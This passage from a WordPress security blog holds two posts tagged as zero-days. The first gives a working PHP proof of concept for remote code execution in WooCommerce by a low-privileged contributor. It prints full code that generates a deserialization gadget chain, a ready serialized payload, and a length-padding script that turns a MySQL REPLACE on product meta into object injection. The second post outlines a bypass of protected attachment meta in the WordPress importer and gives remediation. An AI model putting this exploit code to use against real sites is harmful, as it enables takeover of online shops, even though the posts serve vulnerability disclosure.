<figure class="wp-block-video"><video controls src="https://wpdeeply.com/wp-content/uploads/2020/07/scotch-dolly.mp4"></video><figcaption>How to RCE Woo via contributor user role.</figcaption></figure><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#eli5-poc"></a>Eli5 PoC</h2>



<p>In order someone to be able to exploit issue like this, two things are needed.</p>



<ul><li>PHP gadget chain (Woo have one)</li><li>knowledge about data that will be replaced (it is public data in any Woo instance e.g. shown in product page)</li></ul><p>Woo PHP gadget chain generator that will surviveÂ <code>wc_clean</code></p>



<pre class="wp-block-code"><code lang="php" class="language-php">define("WOO_POC_WIZZARD", TRUE);
if (WOO_POC_WIZZARD){
    if ( isset($argv) && is_array($argv) ){
        if ( sizeof($argv) >= 2 ){
            $call_func = $argv[1];
            $call_func_params = array_slice($argv, 2);
        }else{
            echo "Usage php poc_woo.php print_r input1 input2 ...\n";
            exit();
        }
    }elseif(isset($_REQUEST) && is_array($_REQUEST) ){
        if (sizeof($_REQUEST) >= 1 && isset($_REQUEST["func"])) {
            $call_func = $_REQUEST["func"];
            $call_func_params = isset($_REQUEST["param"])?$_REQUEST["param"]:array();
        }else{
            echo "<p>Usage http://your_localhost/poc_woo.php?func=print_r".htmlentities("&")."param[0]=test".htmlentities("&")."param[1][0]=test2".htmlentities("&")."param[1][1]=test2</p>";
            exit();
        }
    }
}else{
    echo "Set \$call_func and \$call_func_params by hand here\n";
    /*
     $call_func = "print_r";
     $call_func_params = array(array(1,2,3), "search1", "search2");
     //*/
}
class Requests_Utility_FilteredIterator extends ArrayIterator {
    protected $callback;
    public function __construct($data, $callback) {
        parent::__construct($data);
        $this->callback = $callback;
    }
    public function current() {
        $value = parent::current();
        $value = call_user_func($this->callback, $value);
        return $value;
    }
}
class WC_Log_Handler{
}
class WC_Log_Handler_File extends WC_Log_Handler {
    protected $handles = array();
    function __construct($call_func, $call_func_params){
        //seccond argument e.g. print_r is the function that will be called. Could be any php/wp function
        //each array member from the constructor first argument is the input towards the function
        $this->handles = new Requests_Utility_FilteredIterator($call_func_params, $call_func);
    }
}
//create test object
$test_obj = new WC_Log_Handler_File($call_func, $call_func_params);
//string e.g. serialized object
$serialized_obj = serialize($test_obj);
//make it to go trough filters for control characters like wp text sanitation mechanisms
$serialized_obj = str_replace('s:10:"'."\x00".'*'."\x00".'handles"', 'S:10:"\00\2A\00\68\61\6E\64\6C\65\73"', $serialized_obj);
$serialized_obj = str_replace('s:11:"'."\x00".'*'."\x00".'callback"', 'S:11:"\00\2A\00\63\61\6C\6C\62\61\63\6B"', $serialized_obj);
//correct the size of "Requests_Utility_FilteredIterator":_number_: with +22
preg_match('/_FilteredIterator":([0-9]+):/s', $serialized_obj, $found);
$serialized_obj = str_replace($found[0], '_FilteredIterator":'.($found[1]+22).':', $serialized_obj);
//print the test payload
if ( isset($argv) ){
    echo "\n#######payload#######\n";
    echo $serialized_obj."\n";
    echo "#######payload#######\n\n";
}else{
    echo "#######payload#######<br/>";
    echo $serialized_obj."<br/>";
    echo "#######payload#######<br/>";
}
exit();
</code></pre>



<p>this output will be used as input towards final payload generator where we need another constraint: number of bytes that will be added or removed (below script will work for bytes adding and for every number of bytes added payload can be generated)</p>



<pre class="wp-block-code"><code lang="php" class="language-php">//grab it from some payload generator Woo/WP or PHP related 
//https://gist.github.com/Slavco/946905eef6f9cb0f03a2ed2bdee83d9c
$payload_real = 'O:19:"WC_Log_Handler_File":1:{S:10:"\00\2A\00\68\61\6E\64\6C\65\73";C:33:"Requests_Utility_FilteredIterator":101:{x:i:0;a:1:{i:0;s:11:"ScotchDolly";};m:a:1:{S:11:"\00\2A\00\63\61\6C\6C\62\61\63\6B";s:9:"error_log";}}}';

$payload_prepend = '";i:777;'; //chances to have something similar in real payload are marginal so we can use as starting point
$payload_append  = '}';//to finish the serialized string array in this case
$payload_pre_final = $payload_prepend.$payload_real.$payload_append;

//could be anything - this is for this current Woo case :)
$change_str = 's:6:"pa_boo";s:3:"woo";';

$change_in_bytes_plus = 5;
//todo change in bytes minus

$repeat = 0;
$cnt = 1;
do{
    
    $mod = mb_strlen($payload_pre_final) % $change_in_bytes_plus;
    $repeat = mb_strlen($payload_pre_final) / $change_in_bytes_plus;
    if ( $mod !== 0 ){
        $tmp = '";i:'.str_repeat("7", (3+$cnt)).';';
        $old = '";i:'.str_repeat("7", (3+$cnt-1)).';';
        $payload_pre_final = str_replace($old, $tmp, $payload_pre_final);
    }
    $cnt++;
}while( $mod !== 0);

echo urlencode(str_repeat($change_str, $repeat).$payload_pre_final);
exit();
</code></pre>



<p>Now everything left is to add this payload as item of meta value array and to name itÂ <code>%11_default_attributes</code>Â (url encoded) in order to prevent protected meta check and MySQL query to consider it as desired data that need to be changed.</p>



<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE {$wpdb->postmeta} SET meta_value = REPLACE( meta_value, %s, %s ) WHERE meta_key = '_default_attributes'...
</code></pre>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#few-facts"></a>Few facts</h2>



<ul><li>Changing a byte from serialized content results with unserialize of user input, because its format</li><li>PHP serialization is faster than json on big data sets</li><li>When someone say do not change serialized string, it means <a href="https://files.ripstech.com/slides/OWASP_AppSec_EU18_WordPress.pdf" target="_blank" rel="noreferrer noopener">do not</a>. â€“ another core security issue ğŸ™‚ Â </li></ul><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#remediation"></a>Remediation</h2>



<ul><li>Put constraints into your php ini regarding serialization</li><li>Sign your content, so any change from outside world will be detected and not processed</li></ul><p></p>

		</div>

	</div>

	<div class="section-inner">
		
		<div class="post-meta-wrapper post-meta-single post-meta-single-bottom">

			<ul class="post-meta"><li class="post-tags meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Tags</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18"><path fill="" d="M15.4496399,8.42490555 L8.66109799,1.63636364 L1.63636364,1.63636364 L1.63636364,8.66081885 L8.42522727,15.44178 C8.57869221,15.5954158 8.78693789,15.6817418 9.00409091,15.6817418 C9.22124393,15.6817418 9.42948961,15.5954158 9.58327627,15.4414581 L15.4486339,9.57610048 C15.7651495,9.25692435 15.7649133,8.74206554 15.4496399,8.42490555 Z M16.6084423,10.7304545 L10.7406818,16.59822 C10.280287,17.0591273 9.65554997,17.3181054 9.00409091,17.3181054 C8.35263185,17.3181054 7.72789481,17.0591273 7.26815877,16.5988788 L0.239976954,9.57887876 C0.0863319284,9.4254126 0,9.21716044 0,9 L0,0.818181818 C0,0.366312477 0.366312477,0 0.818181818,0 L9,0 C9.21699531,0 9.42510306,0.0862010512 9.57854191,0.239639906 L16.6084423,7.26954545 C17.5601275,8.22691012 17.5601275,9.77308988 16.6084423,10.7304545 Z M5,6 C4.44771525,6 4,5.55228475 4,5 C4,4.44771525 4.44771525,4 5,4 C5.55228475,4 6,4.44771525 6,5 C6,5.55228475 5.55228475,6 5,6 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/tag/0day/" rel="tag">0day</a>						</span>
					</li>
					
			</ul></div>

		
	</div>

	
</article><hr class="post-separator styled-separator is-style-wide section-inner" aria-hidden="true"><article class="post-146 post type-post status-publish format-standard hentry category-core category-plugins tag-0day" id="post-146"><header class="entry-header has-text-align-center"><div class="entry-header-inner section-inner medium">

		
			<div class="entry-categories">
				<span class="screen-reader-text">Categories</span>
				<div class="entry-categories-inner">
					<a href="https://wpdeeply.com/category/core/" rel="category tag">core</a> <a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a>				</div>
			</div>

			<h2 class="entry-title heading-size-1"><a href="https://wpdeeply.com/wordpress-importer-and-attached-file/">WordPress importer and attached file</a></h2>
		<div class="post-meta-wrapper post-meta-single post-meta-single-top">

			<ul class="post-meta"><li class="post-author meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post author</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="20" viewbox="0 0 18 20"><path fill="" d="M18,19 C18,19.5522847 17.5522847,20 17,20 C16.4477153,20 16,19.5522847 16,19 L16,17 C16,15.3431458 14.6568542,14 13,14 L5,14 C3.34314575,14 2,15.3431458 2,17 L2,19 C2,19.5522847 1.55228475,20 1,20 C0.44771525,20 0,19.5522847 0,19 L0,17 C0,14.2385763 2.23857625,12 5,12 L13,12 C15.7614237,12 18,14.2385763 18,17 L18,19 Z M9,10 C6.23857625,10 4,7.76142375 4,5 C4,2.23857625 6.23857625,0 9,0 C11.7614237,0 14,2.23857625 14,5 C14,7.76142375 11.7614237,10 9,10 Z M9,8 C10.6568542,8 12,6.65685425 12,5 C12,3.34314575 10.6568542,2 9,2 C7.34314575,2 6,3.34314575 6,5 C6,6.65685425 7.34314575,8 9,8 Z"></path></svg></span>
						<span class="meta-text">
							By <a href="https://wpdeeply.com/author/root/">root</a>						</span>
					</li>
										<li class="post-date meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post date</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="19" viewbox="0 0 18 19"><path fill="" d="M4.60069444,4.09375 L3.25,4.09375 C2.47334957,4.09375 1.84375,4.72334957 1.84375,5.5 L1.84375,7.26736111 L16.15625,7.26736111 L16.15625,5.5 C16.15625,4.72334957 15.5266504,4.09375 14.75,4.09375 L13.3993056,4.09375 L13.3993056,4.55555556 C13.3993056,5.02154581 13.0215458,5.39930556 12.5555556,5.39930556 C12.0895653,5.39930556 11.7118056,5.02154581 11.7118056,4.55555556 L11.7118056,4.09375 L6.28819444,4.09375 L6.28819444,4.55555556 C6.28819444,5.02154581 5.9104347,5.39930556 5.44444444,5.39930556 C4.97845419,5.39930556 4.60069444,5.02154581 4.60069444,4.55555556 L4.60069444,4.09375 Z M6.28819444,2.40625 L11.7118056,2.40625 L11.7118056,1 C11.7118056,0.534009742 12.0895653,0.15625 12.5555556,0.15625 C13.0215458,0.15625 13.3993056,0.534009742 13.3993056,1 L13.3993056,2.40625 L14.75,2.40625 C16.4586309,2.40625 17.84375,3.79136906 17.84375,5.5 L17.84375,15.875 C17.84375,17.5836309 16.4586309,18.96875 14.75,18.96875 L3.25,18.96875 C1.54136906,18.96875 0.15625,17.5836309 0.15625,15.875 L0.15625,5.5 C0.15625,3.79136906 1.54136906,2.40625 3.25,2.40625 L4.60069444,2.40625 L4.60069444,1 C4.60069444,0.534009742 4.97845419,0.15625 5.44444444,0.15625 C5.9104347,0.15625 6.28819444,0.534009742 6.28819444,1 L6.28819444,2.40625 Z M1.84375,8.95486111 L1.84375,15.875 C1.84375,16.6516504 2.47334957,17.28125 3.25,17.28125 L14.75,17.28125 C15.5266504,17.28125 16.15625,16.6516504 16.15625,15.875 L16.15625,8.95486111 L1.84375,8.95486111 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/wordpress-importer-and-attached-file/">July 17, 2020</a>
						</span>
					</li>
					
			</ul></div>

		
	</div>

</header><div class="post-inner thin ">

		<div class="entry-content">

			
<hr class="wp-block-separator"><p>WordPress project have put a lot of effort to prevent meddling withÂ <code>_wp_attached_file</code>Â meta value. Part of this effort was put into wordpress-importer plugin as part of the core, butâ€¦ Few versions back there was possibility to bypass those restrictions withÂ <code>\</code>Â WP â€œmagicâ€, but there are few more techniques.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-protected-meta.md#eli5-poc"></a>Eli5 PoC</h2>



<p><code>class-wp-import.php</code>Â methodÂ <code>is_valid_meta_key</code>Â we have the following:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function is_valid_meta_key( $key ) {
		// skip attachment metadata since we'll regenerate it from scratch
		// skip _edit_lock as not relevant for import
		if ( in_array( $key, array( '_wp_attached_file', '_wp_attachment_metadata', '_edit_lock' ) ) )
			return false;
		return $key;
	}
</code></pre>



<p>and</p>



<pre class="wp-block-code"><code lang="php" class="language-php">add_filter( 'import_post_meta_key', array( $this, 'is_valid_meta_key' ) );
</code></pre>



<p>Do you seeÂ <code>_wp_attachment_backup_sizes</code>Â blocked in the code? <a href="https://wpdeeply.com/wordpress-attached-file-meta/" target="_blank" rel="noreferrer noopener">Why is that important?</a></p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-protected-meta.md#few-facts"></a>Few facts</h2>



<ul><li>There are reliable attacks against export-import process from low privileged accounts</li></ul><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-protected-meta.md#remediation"></a>Remediation</h2>



<ul><li>Donâ€™t allow wordpress-importer to fall back on theÂ <code>class WXR_Parser_Regex</code></li><li>Do not assign <strong>import</strong> user capabilities on WP related projects </li><li>Add Â <code>_wp_attachment_backup_sizes</code> in the blocked list in the wordpress-importer code</li></ul><p></p>

		</div>

	</div>

	<div class="section-inner">
		
		<div class="post-meta-wrapper post-meta-single post-meta-single-bottom">

			<ul class="post-meta"><li class="post-tags meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Tags</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18"><path fill="" d="M15.4496399,8.42490555 L8.66109799,1.63636364 L1.63636364,1.63636364 L1.63636364,8.66081885 L8.42522727,15.44178 C8.57869221,15.5954158 8.78693789,15.6817418 9.00409091,15.6817418 C9.22124393,15.6817418 9.42948961,15.5954158 9.58327627,15.4414581 L15.4486339,9.57610048 C15.7651495,9.25692435 15.7649133,8.74206554 15.4496399,8.42490555 Z M16.6084423,10.7304545 L10.7406818,16.59822 C10.280287,17.0591273 9.65554997,17.3181054 9.00409091,17.3181054 C8.35263185,17.3181054 7.72789481,17.0591273 7.26815877,16.5988788 L0.239976954,9.57887876 C0.0863319284,9.4254126 0,9.21716044 0,9 L0,0.818181818 C0,0.366312477 0.366312477,0 0.818181818,0 L9,0 C9.21699531,0 9.42510306,0.0862010512 9.57854191,0.239639906 L16.6084423,7.26954545 C17.5601275,8.22691012 17.5601275,9.77308988 16.6084423,10.7304545 Z M5,6 C4.44771525,6 4,5.55228475 4,5 C4,4.44771525 4.44771525,4 5,4 C5.55228475,4 6,4.44771525 6,5 C6,5.55228475 5.55228475,6 5,6 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/tag/0day/" rel="tag">0day</a>						</span>
					</li>
					
			</ul></div>

		
	</div>

	
</article></main><footer id="site-footer" role="contentinfo" class="header-footer-group"><div class="section-inner">

					<div class="footer-credits">

						<p class="footer-copyright">Â©
							2020							<a href="https://wpdeeply.com/">WP deeply</a>
						</p>

						

					</div>

					<a class="to-the-top" href="#site-header">
						<span class="to-the-top-long">
							To the top <span class="arrow" aria-hidden="true">â†‘</span>						</span>
						<span class="to-the-top-short">
							Up <span class="arrow" aria-hidden="true">â†‘</span>						</span>
					</a>

				</div>

			</footer><script>
var prism_settings = {"pluginUrl":"https:\/\/wpdeeply.com\/wp-content\/plugins\/code-syntax-block\/"};
</script><script src="https://wpdeeply.com/wp-content/plugins/code-syntax-block/assets/prism/prism.js"></script><script>
	/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
	</script></body></html>
